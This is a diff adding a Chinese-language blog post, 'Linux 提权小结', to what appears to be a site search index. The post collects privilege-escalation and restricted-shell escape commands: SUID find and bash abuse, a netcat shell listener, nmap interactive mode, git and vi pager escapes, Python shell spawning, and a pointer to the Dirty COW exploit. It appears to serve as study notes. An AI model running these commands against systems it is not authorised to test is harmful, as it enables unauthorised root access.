@@ -370,4 +370,67 @@
         <category>安全实验</category>
       </categories>
   </entry>
+  <entry>
+    <title>Linux 提权小结</title>
+    <url>/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a><strong><em>0x00 前言：</em></strong></h2><p><strong><em>近期对Linux提权颇感兴趣，经拜读相关文章，个人过点实操，权当记录~</em></strong></p>
+<h2 id="0x01-SUID提权："><a href="#0x01-SUID提权：" class="headerlink" title="0x01 SUID提权："></a><strong><em>0x01 SUID提权：</em></strong></h2><p><strong><em>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</em></strong></p>
+<p><strong><em>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<h3 id="例1、find"><a href="#例1、find" class="headerlink" title="例1、find"></a><strong>例1、find</strong></h3><p><strong><em>假如find命令SUID中有”s”权限，就可以直接通过以下命令实现提权操作</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;etc&#x2F;passwd  -exec whoami \;</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;etc&#x2F;passwd  -exec &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/1.png" class>
+
+<p><strong><em>也有另外一种姿势</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp&#x2F;</span><br><span class="line">touch 2333</span><br><span class="line">find 2333 -exec whoami \;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/2.png" class>
+
+<p><strong><em>当然也可以执行反弹shell</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find 2333 -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/3.png" class>
+
+<h3 id="例2、bash"><a href="#例2、bash" class="headerlink" title="例2、bash"></a><strong>例2、bash</strong></h3><p><strong><em>假如bash命令SUID中有”s”权限，就可以直接通过以下命令实现提权操作</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/4.png" class>
+
+<h2 id="0x02-Nmap提权："><a href="#0x02-Nmap提权：" class="headerlink" title="0x02 Nmap提权："></a><strong><em>0x02 Nmap提权：</em></strong></h2><p><strong><em>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/5.png" class>
+
+<h2 id="0x03-Git提权："><a href="#0x03-Git提权：" class="headerlink" title="0x03 Git提权："></a><strong><em>0x03 Git提权：</em></strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">	!&#39;sh&#39;</span><br><span class="line">	或者</span><br><span class="line">sudo git  -p help</span><br><span class="line">	!&#39;sh&#39;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/6.png" class>
+
+<h2 id="0x04-绕过rbash："><a href="#0x04-绕过rbash：" class="headerlink" title="0x04 绕过rbash："></a><strong><em>0x04 绕过rbash：</em></strong></h2><p><strong><em>绕过 rbash , 主要取决于 rbash user 所被允许执行的命令. 通常是利用软件执行外部命令来绕过 rbash. 常见情形的有 vim 、vi、more、less、python 调用 os.system 等. 实际上就是换一个形式调出 bash.</em></strong> </p>
+<h3 id="例1、vi、vim、more、less"><a href="#例1、vi、vim、more、less" class="headerlink" title="例1、vi、vim、more、less"></a><strong>例1、vi、vim、more、less</strong></h3><p><strong><em>如下图所示，原本rbash不允许使用cd命令，通过vi命令强行调出bash绕过</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi 1 </span><br><span class="line">!&#39;sh&#39;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/7.png" class>
+
+<p><strong><em>vim、less、和more命令也类似，直接发图</em></strong></p>
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/8.png" class>
+
+<h3 id="例2、python"><a href="#例2、python" class="headerlink" title="例2、python"></a><strong>例2、python</strong></h3><p><strong><em>若有python权限，则可以尝试调用os模块去绕</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/9.png" class>
+
+<h2 id="0x05-内核提权："><a href="#0x05-内核提权：" class="headerlink" title="0x05 内核提权："></a><em>0x05 内核提权：</em></h2><p><strong><em>这块没啥好说的，就是干。。就稍讲笔者所知的两种套路</em></strong></p>
+<h3 id="1、针对系统版本"><a href="#1、针对系统版本" class="headerlink" title="1、针对系统版本"></a><strong>1、针对系统版本</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、使用lsb_release -a 查看系统版本</span><br><span class="line">2、在kali上使用searchsploit -t 系统版本</span><br><span class="line">3、使用gcc编译后，授权直接跑</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/10.png" class>
+
+<h3 id="2、针对内核版本"><a href="#2、针对内核版本" class="headerlink" title="2、针对内核版本"></a><strong>2、针对内核版本</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用Dirty COW漏洞，需要Linux内核&gt;&#x3D;2.6.22，</span><br><span class="line">exp:https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;dirtyc0w.c</span><br><span class="line">比较出名，自行百度</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>安全技巧</category>
+      </categories>
+  </entry>
 </search>
